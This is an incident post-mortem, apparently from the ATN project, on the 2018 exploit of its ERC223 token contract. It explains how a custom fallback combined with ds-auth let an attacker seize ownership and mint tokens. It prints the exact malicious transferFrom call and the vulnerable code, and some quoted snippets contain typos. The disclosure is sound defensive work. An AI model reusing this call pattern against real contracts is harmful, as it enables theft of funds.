作者：[ATN](https://atn.io/ "ATN")
2018年5月11日中午，ATN技术人员收到异常监控报告，显示ATN
Token供应量出现异常，迅速介入后发现Token合约由于存在漏洞受到攻击。本报告描述黑客的攻击操作、利用的合约漏洞以及ATN的应对追踪方法。
#### 攻击：
  1. 黑客利用ERC223方法漏洞，获得提权，将自己的地址设为owner  
  2. 黑客在获得owner权限后，发行1100w ATN到自己的攻击主地址  
  3. 黑客将owner设置恢复，企图隐藏踪迹  
  4. 黑客从主地址将偷来的黑币分散到14个地址中 
    0x54868268e975f3989d77e0a67c943a5e65ed4a73 3411558.258
    0x62892fd48fd4b2bbf86b75fc4def0a37b224fcc1 946828.3
    0x57be7b4d3e1c6684dac6de664b7809185c8fc356 929,995.9
    0x3b361e253c41897d78902ce5f7e1677fd01083da 838,991
    0x7279e64d3ae20745b150e330fc080050deebeb4d 784,409.41
    0xb729eac33217c0b28251261194d79edd89d18292 762,518.6
    0xe67dc4b47e0ac9b649e52cdb883370d348871d64 682,026.9
    0x44660bae953555ccfdcc5a38c78a5a568b672daa 564,288
    0xf7e915e7ec24818f15c11ec74f7b8d4a604d7538 551,018.8
    0xa4b45e8cca78e862d3729f10f4998da4200f10ef 438,277.6
    0xc98e179f2909b1d0bce5b5d22c92bf803fc0d559 350,597.35
    0xd5f898c7914e05ec7eaa3bf67aafd544a5bb5f24 325,291.1
    0x3dd815af5d728903367a3036bc6dbe291de6f0ee 282,069.29
    0x6d8750f28fffb8e9920490edb4ed1817a4736998 110,261.2948
利用的合约漏洞：
ATN
Token合约采用的是在传统ERC20Token合约基础上的扩展版本[ERC223](https://github.com/ethereum/EIPs/issues/223
"ERC223")，并在其中使用了 [dapphub/ds-auth](https://github.com/dapphub/ds-auth
"dapphub/ds-auth") 库。采用这样的设计是为了实现以下几个能力：
  1. 天然支持Token互换协议，即ERC20Token与ERC20Token之间的直接互换。本质上是发送ATN时，通过回调函数执行额外指令，比如发回其他Token。
  2. 可扩展的、结构化的权限控制能力。
  3. Token合约可升级，在出现意外状况时可进行治理。
单独使用 ERC223 或者 ds-auth 库时，并没有什么问题，但是两者结合时，黑客利用了回调函数回调了setOwner方法，从而获得高级权限。
[ERC223转账](https://github.com/ATNIO/atn-contracts/blob/7203781ad8d106ec6d1f9ca8305e76dd1274b181/src/ATN.sol#L100
"ERC223转账")代码如下：
    function transferFrom(address _from, address _to, uint256 _amount,
    bytes _data, string _custom_fallback) public returns (bool success)
    {
    ...
    ERC223ReceivingContract receiver =
    ERC223ReceivingContract(_to);
    receiving.call.value(0)(byte4(keccak256(_custom_fallback)),
    _from, amout, data);
    ...
    }
当黑客[转账](https://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b
"转账")时在方法中输入以下参数：
    transferFrom( hacker_address, atn_contract_address, 0, 0,
    "setOwner(address)")
    _from: 0x2eca25e9e19b31633db106341a1ba78accba7d0f -- 黑客地址
    _to: 0x461733c17b0755ca5649b6db08b3e213fcf22546 -- ATN合约地址
    _amount: 0
    _data: 0x0
    _custom_fallback: setOwner(address)
该交易执行的时候 receiver 会被 `_to(ATN合约地址)` 赋值， ATN 合约会调用 `_custom_fallback` 即 DSAuth
中的 setOwner(adddress) 方法，而此时的 msg.sender 变为 ATN 合约地址，`owner_`参数为`_from(黑客地址)`
ds-auth库中setOwner [代码](https://github.com/dapphub/ds-auth/blob/c0050bbb6807027c623b1a1ee7afd86515cdb004/src/auth.sol#L36 "代码")如下：
    functuin setOwner(address owner_) public auth
    {
    own = owner_;
    LogSetOwner(owner);
    }
此时 setOwner 会先验证 auth 合法性的，而 msg.sender 就是ATN的合约地址。setOwner 的 modifier
[auth](https://github.com/dapphub/ds-auth/blob/c0050bbb6807027c623b1a1ee7afd86515cdb004/src/auth.sol#L52 "auth")
代码如下：
    modifier auth {
    require(isAuthorized(msg.sender, msg.sig));
    _;
    }
    function isAuthorized(address src, bytes4 sig) internal view returns
    (bool) {
    if (src == address(this)) { //此处的src与ATN合约地址一致返回true
    return true;
    } else { … }
通过利用这个ERC223方法与DS-AUTH库的混合漏洞，黑客将 ATN Token合约的 owner 变更为自己控制的地址。获取 owner
权限后，黑客发起[另外一笔交易](https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910
"另外一笔交易")对 ATN 合约进行攻击，调用 mint 方法给另外一个地址发行 1100wATN。
最后，黑客调用 setOwner
方法将[权限复原](https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a
"权限复原")。
#### 漏洞评估：
漏洞等级：严重